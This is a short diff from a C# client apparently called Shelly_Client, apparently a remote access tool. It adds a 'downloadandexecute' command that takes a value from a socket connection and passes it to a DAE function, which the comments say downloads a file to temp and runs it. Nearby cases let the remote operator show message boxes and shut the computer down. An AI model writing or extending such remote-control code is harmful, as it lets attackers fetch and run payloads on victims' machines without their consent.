@@ -42,6 +42,14 @@ namespace Shelly_Client
                     Functions.General.MsgBox(SocketHandler.Receive());
                     break;
 
+                // Download and execute
+                case "downloadandexecute":
+
+                    // Download file and drop to temp
+                    Functions.General.DAE(SocketHandler.Receive());
+                    
+                    break;
+
                 // Shutdown computer
                 case "shutdown":
 
